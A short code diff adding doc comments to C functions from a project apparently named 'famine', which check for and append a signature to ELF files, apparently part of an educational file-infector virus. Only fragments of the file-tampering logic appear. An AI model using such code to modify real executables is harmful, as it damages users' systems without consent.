@@ -1,5 +1,11 @@
 #include "../include/famine.h"
 
+/**
+ * @brief Check if the file is already signed
+ * @param file The FamineFile structure
+ * @param fd The file descriptor of the opened file
+ * @return TRUE if already signed, FALSE otherwise
+ */
 static s8 check_already_signed(FamineFile *file, int fd) {
     char signature[256] = {};
 
@@ -16,6 +22,10 @@ static s8 check_already_signed(FamineFile *file, int fd) {
     return (FALSE);
 }
 
+/** 
+ * @brief Inject the signature into the ELF file
+ * @param elf The FamineFile structure
+ */
 void inject_signature(FamineFile *elf) {
     DBG("Injecting signature: %s", SIGNATURE);
     int fd = open(elf->name, O_RDWR | O_APPEND);
